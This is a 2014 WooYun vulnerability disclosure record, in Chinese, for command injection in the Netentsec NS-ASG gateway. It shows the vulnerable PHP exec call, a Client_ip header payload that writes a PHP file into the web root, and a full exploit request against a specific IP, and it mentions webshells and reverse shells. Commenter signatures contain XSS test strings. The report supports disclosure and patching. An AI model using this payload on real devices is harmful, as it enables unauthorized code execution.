{"id": 2582, "wybug_id": "wooyun-2014-058934", "wybug_title": "网康 NS-ASG 应用安全网关远程代码执行", "wybug_corp": "网康科技", "wybug_author": "狗狗侠", "wybug_date": "2014-04-30 11:25", "wybug_open_date": "2014-07-29 11:26", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-29：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 第三弹准时来了。。乌云不错。。。 详细说明：  剑总 疯狗叔叔。。。乌云还会给力吧？那我就再来几蛋。。无需登录即可利用0x01  在网关首页index.php处\n<?include(\"include/common.inc\");unset($_SESSION['parastr']);$par = substr($_SERVER['REQUEST_URI'],1);if($par==\"\"){\t$par=\"index\";}if(strpos($par,\".php\")){\t$par=substr($par,0,-4);}$remote_ip = GetIP();//跟踪该函数$dbh = db_connect();$query = \"select ItemValue from Configure where ItemName='AutoRouteIn'\";$res = db_query($dbh, $query, '查询接入选路开关');list($autoroutein) = db_fetch_row($res);if($autoroutein == 'yes') //选路开关已打开{\t$query = \"select ItemValue from Configure where ItemName='AutoRouteInConf'\";\t$res = db_query($dbh, $query, '查询接入选路开关');\tlist($autorouteinconf) = db_fetch_row($res);\t$routeinarr = explode(\",\", $autorouteinconf);\t$diffArr = array();\t\tfor($i=0; $i<count($routeinarr); $i++)\t{\t\tunset($r1);\t\tunset($r2);\t\texec(\"/bin/ping -I \".$routeinarr[$i].\" \".$remote_ip.\" -c 1\", $r1, $r2);//漏洞触发点\t\tif(!$r2)\n我们跟踪下GetIP()函数在include/common.in中78行\nfunction GetIP(){\tif (getenv(\"HTTP_CLIENT_IP\") && strcasecmp(getenv(\"HTTP_CLIENT_IP\"), \"unknown\"))\t\t$ip = getenv(\"HTTP_CLIENT_IP\");\telse if (getenv(\"HTTP_X_FORWARDED_FOR\") && strcasecmp(getenv(\"HTTP_X_FORWARDED_FOR\"), \"unknown\"))\t\t$ip = getenv(\"HTTP_X_FORWARDED_FOR\");\telse if (getenv(\"REMOTE_ADDR\") && strcasecmp(getenv(\"REMOTE_ADDR\"), \"unknown\"))\t\t$ip = getenv(\"REMOTE_ADDR\");\telse if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], \"unknown\"))\t\t$ip = $_SERVER['REMOTE_ADDR'];\telse\t\t$ip = \"unknown\";\tif($ip == '127.0.0.1')\t\t$ip = $_SERVER[\"HTTP_ISC_CLIENT_ADDRESS\"];\treturn($ip);}\n这里可以伪造IP了通过伪造的ip传送到\nexec(\"/bin/ping -I \".$routeinarr[$i].\" \".$remote_ip.\" -c 1\", $r1, $r2);//漏洞触发点\n这里即可触发漏洞，直接写shell（网康防火墙默认路径/Isc/third-party/httpd/htdocs/）或者反弹shell。。都可以...伪造ip为：|| echo \"<?php phpinfo();?>\" > /Isc/third-party/httpd/htdocs/test.php||即可将phpinfo()写入到防火墙当中如下即可写shell\nGET /index.php HTTP/1.1Host: 211.68.223.12User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateClient_ip: || echo \"<?php phpinfo();?>\" > /Isc/third-party/httpd/htdocs/test.php||Cookie: PHPSESSID=eab5c07307cc005326b12e190f129509Connection: keep-aliveCache-Control: max-age=0\n   漏洞证明：  \nGET /index.php HTTP/1.1Host: 211.68.223.12User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateClient_ip: || echo \"<?php phpinfo();?>\" > /Isc/third-party/httpd/htdocs/test.php||Cookie: PHPSESSID=eab5c07307cc005326b12e190f129509Connection: keep-aliveCache-Control: max-age=0\n   修复方案：  这个。。。。还是尽量修吧   版权声明：转载请注明来源 狗狗侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-01 22:03 厂商回复： 4月29日，网康收到CNVD漏洞细节通知，迅速启动并同时展开了以下工作：1.进一步验证漏洞细节，目前已确认所曝漏洞确实存在于ASG产品；2.对全线产品进行安全自查，重点确认ASG产品是否仍存其它未知漏洞，并验证类似漏洞是否同存于其它产品线，截至目前，自查工作仍在进行中，全线产品暂未发现新的漏洞；3.开发用于漏洞修补的更新程序，将尽快发布应急补丁包，介时用户可通过操作设备管理界面直接安装该更新程序以对所曝漏洞进行应急性修补；4.售后服务部通过内部CRM系统导出全部ASG用户名单，并开始逐一联系用户通报漏洞情况，补丁包发布后，将再次逐一通知所有用户及时安装更新，此项工作预计3工作日内完成；5.为避免统计疏漏，工程部于4月30日16:00向CNVD共享了在线ASG设备的辨识方法，将配合CNVD共同开展在线设备的主动探测工作，一旦发现未更新补丁的在线设备，将联系并协助用户及时更新，此项工作预计10工作日内完成；6.将尽快向社会开放漏洞提交邮箱，接受第三方机构、白帽子及其它组织、个人向网康提交产品漏洞，向所有帮助网康产品进步的组织和人士表示感谢。 最新状态： 2014-07-17：已随版本更新解决  ", "replys": "漏洞评价：\n评论\n     2014-04-30 11:29 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  你是不是对网康太粗暴了点~~哈哈    \n     2014-04-30 11:30 |    \t\tTea \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:37        | Can't We Be Young.)\t\t \n  看来你们是把源码扒下来了。。    \n     2014-04-30 11:31 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  网康：轻点，疼    \n     2014-04-30 11:52 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  被你们都搞死了    \n     2014-07-29 11:30 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  狗狗侠，这名字。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}